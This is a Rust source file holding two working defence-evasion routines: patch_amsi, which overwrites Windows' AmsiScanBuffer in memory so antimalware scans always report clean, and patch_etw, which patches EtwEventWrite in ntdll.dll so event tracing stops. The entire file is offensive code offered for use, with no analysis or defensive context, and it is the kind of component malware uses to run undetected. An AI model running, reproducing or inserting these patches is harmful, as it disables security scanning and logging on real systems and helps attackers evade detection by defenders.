use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::memoryapi::VirtualProtect;
use winapi::shared::minwindef::{DWORD, LPVOID};
use std::ptr;
use std::ffi::CString;

/// Patches AMSI (Antimalware Scan Interface) to always return AMSI_RESULT_CLEAN.
pub fn patch_amsi() -> bool {
    unsafe {
        let dll_name = CString::new("amsi.dll").unwrap();
        let func_name = CString::new("AmsiScanBuffer").unwrap();

        let handle = GetModuleHandleA(dll_name.as_ptr());
        if handle.is_null() { return false; }

        let func_addr = GetProcAddress(handle, func_name.as_ptr());
        if func_addr.is_null() { return false; }

        // Patch: xor eax, eax; ret (return 0 -> S_OK / CLEAN)
        // x64: 0x31, 0xC0, 0xC3
        let patch = [0x31, 0xC0, 0xC3];
        
        let mut old_protect: DWORD = 0;
        if VirtualProtect(func_addr as LPVOID, patch.len(), 0x40, &mut old_protect) == 0 {
            return false;
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());

        VirtualProtect(func_addr as LPVOID, patch.len(), old_protect, &mut old_protect);
        true
    }
}

/// Patches ETW (Event Tracing for Windows) to prevent event emission.
pub fn patch_etw() -> bool {
    unsafe {
        let dll_name = CString::new("ntdll.dll").unwrap();
        let func_name = CString::new("EtwEventWrite").unwrap();

        let handle = GetModuleHandleA(dll_name.as_ptr());
        if handle.is_null() { return false; }

        let func_addr = GetProcAddress(handle, func_name.as_ptr());
        if func_addr.is_null() { return false; }

        // Patch: xor eax, eax; ret (return 0 -> SUCCESS)
        // x64: 0x31, 0xC0, 0xC3
        // Note: EtwEventWrite returns NTSTATUS, 0 is STATUS_SUCCESS.
        // Usually patching with `ret 14h` (c2 14 00) for stack cleanup on x86, but on x64 just ret is fine (caller cleans up shadow space?)
        // Actually, EtwEventWrite is standard call. simple ret might crash if parameters are expected to be cleaned? 
        // x64 uses registers for first 4 args, so `ret` is safe.
        let patch = [0x31, 0xC0, 0xC3];

        let mut old_protect: DWORD = 0;
        if VirtualProtect(func_addr as LPVOID, patch.len(), 0x40, &mut old_protect) == 0 {
            return false;
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());

        VirtualProtect(func_addr as LPVOID, patch.len(), old_protect, &mut old_protect);
        true
    }
}
